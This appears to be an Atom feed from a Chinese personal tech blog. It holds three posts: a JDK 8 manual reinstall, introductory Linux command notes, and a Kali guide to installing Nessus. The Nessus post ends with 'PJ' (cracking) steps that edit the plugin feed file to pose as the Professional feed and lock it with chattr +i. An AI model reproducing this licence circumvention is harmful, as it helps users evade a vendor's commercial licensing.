<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MTRleed</title>
  
  <subtitle>吾将上下而求索</subtitle>
  <link href="https://www.mtrleed.top/atom.xml" rel="self"/>
  
  <link href="https://www.mtrleed.top/"/>
  <updated>2023-03-04T02:30:08.577Z</updated>
  <id>https://www.mtrleed.top/</id>
  
  <author>
    <name>MTRleed</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JDK安装失败</title>
    <link href="https://www.mtrleed.top/post/6/"/>
    <id>https://www.mtrleed.top/post/6/</id>
    <published>2023-02-26T16:00:00.000Z</published>
    <updated>2023-03-04T02:30:08.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天在配置实验环境的时候一不小心卸载了所有的JDK，心想应该没什么，想要挨个重新安装就好了。但是就在安装JDK8的时候，.exe文件死活不运行，在尝试了多种方法无果后，看到了一个相似的案例，随后对应着自己所出现的问题一步一步重新将JDK8装了回来。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>到官网下载自己所需的JDK安装文件 <a href="https://www.oracle.com/java/technologies/downloads/archive/">oracle官网</a><br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2023/jdk.png"></p><p>​      </p><p>使用7z提取出文件<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2023/jdk1.png"></p><p>​      </p><p>进入提取出来的文件，找到jdk-8u361-windows-x64.rsrc\1033\JAVA_CAB10下的这个文件，并提取文件<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2023/jdk2.png"></p><p>随后就会提取出tools压缩包，我们解压一下<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2023/jdk3.png"></p><p>​      </p><p>解压后是这样的，和jdk基本一样了<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2023/jdk4.png"></p><p>​        </p><p>然后再将这些文件移动到想要的位置并在地址栏打开cmd<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2023/jdk5.png"></p><p>​      </p><p>在cmd中运行以下命令，成功运行结束后就算安装成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /r %x in (*.pack) do .\bin\unpack200 -r &quot;%x&quot; &quot;%~dx%~px%~nx.jar&quot;</span><br></pre></td></tr></table></figure><p>​        </p><p>JDK<a href="https://blog.csdn.net/lcszz0302/article/details/119177184?spm=1001.2014.3001.5501">修改版本链接文章</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天在配置实验环境的时候一不小心卸载了所有的JDK，心想应该没什么，想要挨个重新安装就好了。但是就在安装JDK8的时候，.exe文件死活不运</summary>
      
    
    
    
    <category term="随笔" scheme="https://www.mtrleed.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux随记</title>
    <link href="https://www.mtrleed.top/post/4/"/>
    <id>https://www.mtrleed.top/post/4/</id>
    <published>2022-12-19T16:00:00.000Z</published>
    <updated>2023-01-15T12:32:03.516Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此为 Linux 的小笔记</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Linux-系统文件结构"><a href="#Linux-系统文件结构" class="headerlink" title="Linux 系统文件结构"></a>Linux 系统文件结构</h3><p>Linux 系统不像 Windows 系统那样拥有<strong>注册表</strong>对系统进行统一的管理，而是由一个庞大树状结构的文件目录所组成，分散管理，以”/“开始，称为根目录。可以说 在 Linux 中都是文件。<br>那么，该系统文件结构具体是什么样的呢？<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png">  </p><p><strong>注意：</strong>Linux 中的目录结构并不像 Windows 中的那样具有包含关系，Linux 中的目录只是一个引索点而已，不存在包含关系。</p><table><thead><tr><th align="center">1级目录</th><th align="left">存放的数据</th></tr></thead><tbody><tr><td align="center">/bin/</td><td align="left">存放普通用户和 root 都可以执行的系统命令</td></tr><tr><td align="center">/boot/</td><td align="left">系统启动引导目录，存放跟系统启动相关的文件</td></tr><tr><td align="center">/dev/</td><td align="left">设备文件保存目录</td></tr><tr><td align="center">/etc/</td><td align="left">配置文件保存目录</td></tr><tr><td align="center">/home/</td><td align="left">普通用户家目录</td></tr><tr><td align="center">/lib/</td><td align="left">库文件保存目录，一些应用的零件</td></tr><tr><td align="center">/media/</td><td align="left">挂载目录。可以用来挂载媒体设备，如软盘和光盘</td></tr><tr><td align="center">/mnt/</td><td align="left">挂载目录。如 U 盘、移动硬盘和其他操作系统的分区</td></tr><tr><td align="center">/misc/</td><td align="left">挂载目录。可以用来挂载 NFS 服务的共享目录。虽然系统准备了三个默认挂载目录  /media/、/mnt/、/misc/，但是到底在哪个目录中挂载什么设备可以由自己决定</td></tr><tr><td align="center">/opt/</td><td align="left">第三方安装的软件保存位置。这个目录是放置和安装其他软件的位置，手工安装的源码包软件都可以安装到这个目录中。</td></tr><tr><td align="center">/root/</td><td align="left">root 的主目录。普通用户主目录在 /home/ 下，root 主目录直接在“/”下</td></tr><tr><td align="center">/sbin/</td><td align="left">root 能使用的系统命令</td></tr><tr><td align="center">/srv/</td><td align="left">服务数据保存目录。一些系统服务启动之后，可以在这个目录中保存所需要的数据</td></tr><tr><td align="center">/tmp/</td><td align="left">临时文件目录。系统存放临时文件的目录，在该目录下，所有用户都可以访问和写入。解压缩，机器之间拷贝文件都要用到该目录</td></tr><tr><td align="center">/usr/</td><td align="left">第三方安装的东西可以放在这里，如自己装的软件等等，首先选此目录，其次选择 /opt/ 目录，目录下还可以在细分其他目录</td></tr><tr><td align="center">/svr/</td><td align="left">一些服务</td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E8%A7%A3%E9%87%8A.png"></p><h3 id="文件目录命名规则"><a href="#文件目录命名规则" class="headerlink" title="文件目录命名规则"></a>文件目录命名规则</h3><p>首先 Linux 是区分大小写的，比如 aaa 文件或目录与 AAA 文件或目录是两个不同的文件或目录。<br>另外，Linux 对文件扩展名(后缀)是不区分的，也就是说，一张 a.jpg 的图片在 Linux 中即使不加 .jpg 也能正常显示，文件内容该是什么打开后就是什么。</p><h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><p>Shell是系统的用户界面，显示为一个命令行，它提供了用户与内核进行交互操作的一种接口。它接收用户输入的命令并把它送入内核去执行<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shell.png"></p><h3 id="Linux-简单命令"><a href="#Linux-简单命令" class="headerlink" title="Linux 简单命令"></a>Linux 简单命令</h3><p>在 Linux 下我们会使用到很多的命令，有内部命令和外部命令的区别。内部命令是随 shell 一起加载好的，可以直接用，外部命令需要找到命令所在位置才可以使用，或者添加到环境变变量中去。</p><h4 id="Linux-环境变量"><a href="#Linux-环境变量" class="headerlink" title="Linux 环境变量"></a>Linux 环境变量</h4><p>环境变量是指在操作系统中用来指定操作系统运行的一些参数：也就是说，操作系统通过环境变量来找到运行时的一些资源。在 Windows 中大家很熟悉。Linux 使用 env 命令来查看到 Linux 系统中所有的环境变量。<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F.png"></p><p>我们先来认识一下 Linux 命令的基本格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux命令= 命令 -【选项】 【参数】</span><br></pre></td></tr></table></figure><p>并不是所有的都需要以上三个部分，后两部分不是必须。<br>【选项】是命令的一些操作的指令，实现命令的某些功能。- 后一般接单个字母，– 后一般接单词<br>【参数】通常是被命令操作的对象，例如文件，目录等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx --<span class="built_in">help</span>  给一些小tips</span><br><span class="line">man xxx 完整的使用手册（没有分类整理）</span><br><span class="line">info  xxx 完整的使用手册（有分类整理）</span><br></pre></td></tr></table></figure><h4 id="系统服务控制命令"><a href="#系统服务控制命令" class="headerlink" title="系统服务控制命令"></a>系统服务控制命令</h4><p>针对服务的控制的命令，常用的就是 systemctl ，语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl [控制命令] [服务名称]</span><br></pre></td></tr></table></figure><blockquote><p>[控制命令] 有：<br>start 启动<br>stop 停止<br>restart 重启 (先关闭，再启动)<br>reload 重新加载 (不关闭当前服务的重启)<br>status 查看服务状态 (运行中还是关闭状态)</p></blockquote><h4 id="cd-命令"><a href="#cd-命令" class="headerlink" title="cd 命令"></a>cd 命令</h4><p>它是用来切换工作目录的，根据后面所接的符号，路径等进行跳转</p><table><thead><tr><th align="center">符号</th><th align="center">意义</th></tr></thead><tbody><tr><td align="center">~</td><td align="center">家目录</td></tr><tr><td align="center">..</td><td align="center">上一级目录</td></tr><tr><td align="center">.</td><td align="center">当前目录</td></tr><tr><td align="center">-</td><td align="center">上次的目录</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[mtrleed@localhost /]$ <span class="built_in">cd</span> opt</span><br><span class="line">[mtrleed@localhost opt]$ <span class="built_in">cd</span> ..</span><br><span class="line">[mtrleed@localhost /]$ <span class="built_in">cd</span> -</span><br><span class="line">/opt</span><br><span class="line">[mtrleed@localhost opt]$ <span class="built_in">cd</span> ../</span><br><span class="line">[mtrleed@localhost /]$ <span class="built_in">cd</span> ~</span><br><span class="line">[mtrleed@localhost ~]$ <span class="built_in">pwd</span></span><br><span class="line">/home/mtrleed</span><br><span class="line">[mtrleed@localhost ~]$ </span><br></pre></td></tr></table></figure><h4 id="ls-命令"><a href="#ls-命令" class="headerlink" title="ls 命令"></a>ls 命令</h4><p>此命令全名为 list ，用来罗列出文件等信息，它同样有着很多的【选项】</p><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>-a</td><td>显示全部的文件，包括隐藏文件（隐藏文件通常为 . 开头）</td></tr><tr><td>-d</td><td>仅列出目录本身，而不是列出目录内的文件数据</td></tr><tr><td>-F</td><td>在文件或目录名后加上文件类型的指示符号，例如，* 代表可运行文件，/ 代表目录，= 代表 <a href="http://c.biancheng.net/socket/">socket</a> 文件，| 代表 FIFO 文件</td></tr><tr><td>-h</td><td>以人们易读的方式显示文件或目录大小，如 1KB、234MB、2GB 等</td></tr><tr><td>-i</td><td>显示 inode 节点信息，与磁盘有关</td></tr><tr><td>-l</td><td>使用长格式列出文件和目录信息，就是详细信息</td></tr><tr><td>-R</td><td>连同子目录内容一起列出来，将该目录下的所有文件都显示出来</td></tr><tr><td>-S</td><td>以文件容量大小排序</td></tr><tr><td>-t</td><td>以时间排序</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[mtrleed@localhost /]$ ls  </span><br><span class="line">bin   dev  home  lib64  mnt  proc  run   srv  tmp  var</span><br><span class="line">boot  etc  lib   media  opt  root  sbin  sys  usr</span><br><span class="line">[mtrleed@localhost /]$ ls -a</span><br><span class="line">.   bin   dev  home  lib64  mnt  proc  run   srv  tmp  var</span><br><span class="line">..  boot  etc  lib   media  opt  root  sbin  sys  usr</span><br><span class="line">[mtrleed@localhost /]$ ls -l</span><br><span class="line">总用量 28</span><br><span class="line">lrwxrwxrwx.   1 root root    7 1月   3 01:42 bin -&gt; usr/bin</span><br><span class="line">dr-xr-xr-x.   5 root root 4096 1月   3 01:48 boot</span><br><span class="line">drwxr-xr-x.  20 root root 3320 1月   3 23:17 dev</span><br><span class="line">drwxr-xr-x. 148 root root 8192 1月   3 01:50 etc</span><br><span class="line">drwxr-xr-x.   3 root root   21 1月   3 01:47 home</span><br><span class="line">lrwxrwxrwx.   1 root root    7 1月   3 01:42 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx.   1 root root    9 1月   3 01:42 lib64 -&gt; usr/lib64</span><br><span class="line">drwxr-xr-x.   2 root root    6 4月  11 2018 media</span><br><span class="line">drwxr-xr-x.   2 root root    6 4月  11 2018 mnt</span><br><span class="line">drwxr-xr-x.   3 root root   16 1月   3 01:45 opt</span><br><span class="line">dr-xr-xr-x. 251 root root    0 1月   3 23:17 proc</span><br><span class="line">dr-xr-x---.  15 root root 4096 1月   3 23:18 root</span><br><span class="line">drwxr-xr-x.  45 root root 1300 1月   3 23:19 run</span><br><span class="line">lrwxrwxrwx.   1 root root    8 1月   3 01:42 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x.   2 root root    6 4月  11 2018 srv</span><br><span class="line">dr-xr-xr-x.  13 root root    0 1月   3 23:17 sys</span><br><span class="line">drwxrwxrwt.  29 root root 4096 1月   3 23:19 tmp</span><br><span class="line">drwxr-xr-x.  13 root root  155 1月   3 01:42 usr</span><br><span class="line">drwxr-xr-x.  21 root root 4096 1月   3 01:50 var</span><br><span class="line">[mtrleed@localhost /]$ ls -lh</span><br><span class="line">总用量 28K</span><br><span class="line">lrwxrwxrwx.   1 root root    7 1月   3 01:42 bin -&gt; usr/bin</span><br><span class="line">dr-xr-xr-x.   5 root root 4.0K 1月   3 01:48 boot</span><br><span class="line">drwxr-xr-x.  20 root root 3.3K 1月   3 23:17 dev</span><br><span class="line">drwxr-xr-x. 148 root root 8.0K 1月   3 01:50 etc</span><br><span class="line">drwxr-xr-x.   3 root root   21 1月   3 01:47 home</span><br><span class="line">lrwxrwxrwx.   1 root root    7 1月   3 01:42 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx.   1 root root    9 1月   3 01:42 lib64 -&gt; usr/lib64</span><br><span class="line">drwxr-xr-x.   2 root root    6 4月  11 2018 media</span><br><span class="line">drwxr-xr-x.   2 root root    6 4月  11 2018 mnt</span><br><span class="line">drwxr-xr-x.   3 root root   16 1月   3 01:45 opt</span><br><span class="line">dr-xr-xr-x. 251 root root    0 1月   3 23:17 proc</span><br><span class="line">dr-xr-x---.  15 root root 4.0K 1月   3 23:18 root</span><br><span class="line">drwxr-xr-x.  45 root root 1.3K 1月   3 23:19 run</span><br><span class="line">lrwxrwxrwx.   1 root root    8 1月   3 01:42 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x.   2 root root    6 4月  11 2018 srv</span><br><span class="line">dr-xr-xr-x.  13 root root    0 1月   3 23:17 sys</span><br><span class="line">drwxrwxrwt.  29 root root 4.0K 1月   3 23:19 tmp</span><br><span class="line">drwxr-xr-x.  13 root root  155 1月   3 01:42 usr</span><br><span class="line">drwxr-xr-x.  21 root root 4.0K 1月   3 01:50 var</span><br></pre></td></tr></table></figure><p>注意，只有文件的大小是能确定的，目录的大小是引索的大小，而不是目录下的数据的大小</p><h4 id="pwd-命令"><a href="#pwd-命令" class="headerlink" title="pwd 命令"></a>pwd 命令</h4><p>此命令用来显示当前的工作目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[mtrleed@localhost /]$ <span class="built_in">cd</span> opt</span><br><span class="line">[mtrleed@localhost opt]$ <span class="built_in">pwd</span></span><br><span class="line">/opt</span><br></pre></td></tr></table></figure><h4 id="mkdir-命令"><a href="#mkdir-命令" class="headerlink" title="mkdir 命令"></a>mkdir 命令</h4><p>该命令用来创建目录，通常目录跟随着访问权限，我们要用到 -m ，在需要创建自定义多级目录的情况下需要用到 -p ，否则是无法创建的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost opt]<span class="comment"># mkdir test</span></span><br><span class="line">[root@localhost opt]<span class="comment"># ls</span></span><br><span class="line">rh  <span class="built_in">test</span></span><br><span class="line">[root@localhost opt]<span class="comment"># mkdir zhangsan/test1</span></span><br><span class="line">mkdir: 无法创建目录<span class="string">&quot;zhangsan/test1&quot;</span>: 没有那个文件或目录</span><br><span class="line">[root@localhost opt]<span class="comment"># mkdir -p zhangsan/test1</span></span><br><span class="line">[root@localhost opt]<span class="comment"># ls</span></span><br><span class="line">rh  <span class="built_in">test</span>  zhangsan</span><br></pre></td></tr></table></figure><h4 id="touch-命令"><a href="#touch-命令" class="headerlink" title="touch 命令"></a>touch 命令</h4><p>该命令用于创建文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost opt]<span class="comment"># cd test</span></span><br><span class="line">[root@localhost <span class="built_in">test</span>]<span class="comment"># touch TTT</span></span><br><span class="line">[root@localhost <span class="built_in">test</span>]<span class="comment"># ls</span></span><br><span class="line">TTT</span><br></pre></td></tr></table></figure><h4 id="rm-命令"><a href="#rm-命令" class="headerlink" title="rm 命令"></a>rm 命令</h4><p>该命令用于删除目录或文件，具有破坏性，谨慎</p><table><thead><tr><th align="center">选项</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-f</td><td align="center">强制删除，递归删除时按需用，否则需多次 y (慎用)</td></tr><tr><td align="center">-i</td><td align="center">提示是否确定删除</td></tr><tr><td align="center">-r</td><td align="center">递归删除，删除目录时要用到</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost opt]<span class="comment"># rm -r test</span></span><br><span class="line">rm：是否进入目录<span class="string">&quot;test&quot;</span>? y</span><br><span class="line">rm：是否删除普通空文件 <span class="string">&quot;test/TTT&quot;</span>？y</span><br><span class="line">rm：是否删除目录 <span class="string">&quot;test&quot;</span>？y</span><br><span class="line">[root@localhost opt]<span class="comment"># ls</span></span><br><span class="line">rh  zhangsan</span><br></pre></td></tr></table></figure><h4 id="cp-命令"><a href="#cp-命令" class="headerlink" title="cp 命令"></a>cp 命令</h4><p>该命令用于复制文件或目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp [选项] [源文件] [目标文件]</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">选项</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-i</td><td align="center">询问，若存在询问是否覆盖</td></tr><tr><td align="center">-p</td><td align="center">保留源文件的属性，包括所有者、所属组和时间</td></tr><tr><td align="center">-r</td><td align="center">递归复制，用于复制目录</td></tr></tbody></table><h4 id="mv-命令"><a href="#mv-命令" class="headerlink" title="mv 命令"></a>mv 命令</h4><p>该命令用于移动文件或目录，具有破坏性，谨慎</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv [选项] [源文件] [目标文件]</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">选项</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-f</td><td align="center">强制移动覆盖</td></tr><tr><td align="center">-i</td><td align="center">询问，如果目标文件已经存在，则询问用户是否覆盖（默认选项）</td></tr></tbody></table><p>如果源文件和目标文件在同一目录中，就会改名为 [目标文件]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># mv test test1  //test 文件改名为 test1</span></span><br></pre></td></tr></table></figure><h4 id="su-命令"><a href="#su-命令" class="headerlink" title="su 命令"></a>su 命令</h4><p>该命令用于临时切换用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost /]<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">[root@localhost /]<span class="comment"># su mtrleed</span></span><br><span class="line">[mtrleed@localhost /]$ whoami</span><br><span class="line">mtrleed</span><br></pre></td></tr></table></figure><h4 id="sudo-命令"><a href="#sudo-命令" class="headerlink" title="sudo 命令"></a>sudo 命令</h4><p>该命令用于临时使用 root 权限来执行某些命令，在需要执行的命令前添加即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;此为 Linux 的小笔记&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;</summary>
      
    
    
    
    <category term="操作系统" scheme="https://www.mtrleed.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="Linux系统" scheme="https://www.mtrleed.top/tags/Linux%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>kali部署nessus</title>
    <link href="https://www.mtrleed.top/post/3/"/>
    <id>https://www.mtrleed.top/post/3/</id>
    <published>2022-11-07T16:00:00.000Z</published>
    <updated>2023-03-04T02:29:17.924Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近有需要在机器用到漏扫，发现nessus还不错，索性在虚拟机上安装了。安装过程有些要注意的地方，诶我又索性做个笔记。话不多说开干 🛠</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h3><p>因为是国外服务器所以建议科学上网。到官网寻找适合自己系统版本的nessus发行版，地址在这 <a href="https://www.tenable.com/downloads/nessus%E3%80%82%E8%BF%99%E6%98%AF%E6%88%91%E9%80%89%E6%8B%A9%E7%9A%84%E7%89%88%E6%9C%AC">https://www.tenable.com/downloads/nessus。这是我选择的版本</a><br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus1.png"></p><h3 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h3><p>将下载好的安装包放到自己想放的地方，我选择 opt 目录。在此目录下启动终端，执行命令安装该软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i Nessus-10.4.1-debian9_amd64.deb</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus2.png">    </p><p>​       </p><p>安装好后启动nessus试试，使用命令 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start nessusd.service 或 service nessusd start</span><br></pre></td></tr></table></figure><p>​       </p><p>随后访问，nessus走 SSL 协议所以 https ,默认端口8834，浏览器会提示有安全风险，点击“高级”，再点击“接受风险并继续” 直接无视。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://localhost:8834/</span><br></pre></td></tr></table></figure><p>选择所示版本<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus3.png"></p><p>​        </p><p>这里选择 .sc<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus4.png"></p><p>​        </p><p>创建账号密码（随意)<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus5.png"></p><p>​        </p><p>之后等待一会进入界面<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus6.png"></p><p>现在还不能使用，下面进行 PJ</p><p>​        </p><p>我们需要用到 nessus 的一个叫挑战码的东西，执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/nessus/sbin/nessuscli fetch --challenge </span><br></pre></td></tr></table></figure><p>就是这个<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus7.png"></p><p>​        </p><p>下一步到官网填邮箱拿激活码，地址在这 <a href="https://www.tenable.com/products/nessus/nessus-essentials">https://www.tenable.com/products/nessus/nessus-essentials</a><br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus8.png"></p><p>​        </p><p>随后访问网站 <a href="https://plugins.nessus.org/v2/offline.php">https://plugins.nessus.org/v2/offline.php</a><br>在其中输入刚才获得的挑战码和激活码，点击 subimt，获取 license 和 插件包<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus9.png"></p><p>我们要进行离线注册，先停止 nessus 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stop nessusd.service 或 service nessusd stop</span><br></pre></td></tr></table></figure><p>​         </p><p>然后开始注册</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/nessus/sbin/nessuscli fetch --register-offline /许可文件nessus.license路径/nessus.license</span><br></pre></td></tr></table></figure><p>​       </p><p>离线加载我们的插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/nessus/sbin/nessuscli update /插件包all-2.0.tar.gz文件路径/all-2.0.tar.gz</span><br></pre></td></tr></table></figure><p>​        </p><p>查看插件的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc</span><br></pre></td></tr></table></figure><p>PLUGIN_SET 的数字后面要用到</p><p>​        </p><p>修改配置文件的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc</span><br></pre></td></tr></table></figure><p>修改里面的内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PLUGIN_SET = &quot;XXXXXX&quot;; </span><br><span class="line">PLUGIN_FEED = &quot;ProfessionalFeed (Direct)&quot;; </span><br><span class="line">PLUGIN_FEED_TRANSPORT = &quot;Tenable Network Security Lightning&quot;;</span><br><span class="line"></span><br><span class="line">PLUGIN_SET = &quot;XXXXXX&quot;;填上刚刚查询到的信息</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus10.png">    </p><p>​        </p><p>再编辑另一个配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/nessus/var/nessus/plugin_feed_info.inc </span><br></pre></td></tr></table></figure><p>内容和上述文件内容一致</p><p>​        </p><p>将这份文件拷贝到同目录的 plugins 目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/nessus/var/nessus/   </span><br><span class="line">cp plugin_feed_info.inc plugins</span><br></pre></td></tr></table></figure><p>经过测试，虚拟机重启后，Nessus服务每次重启后，都会重置 plugin_feed_info.inc，这将会使 nessus/plugins 目录下所有的插件都被删除，无法扫描。因此我们将此文件设为只读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr +i /opt/nessus/var/nessus/plugin_feed_info.inc</span><br></pre></td></tr></table></figure><p>​         </p><p>重新启动 nessus 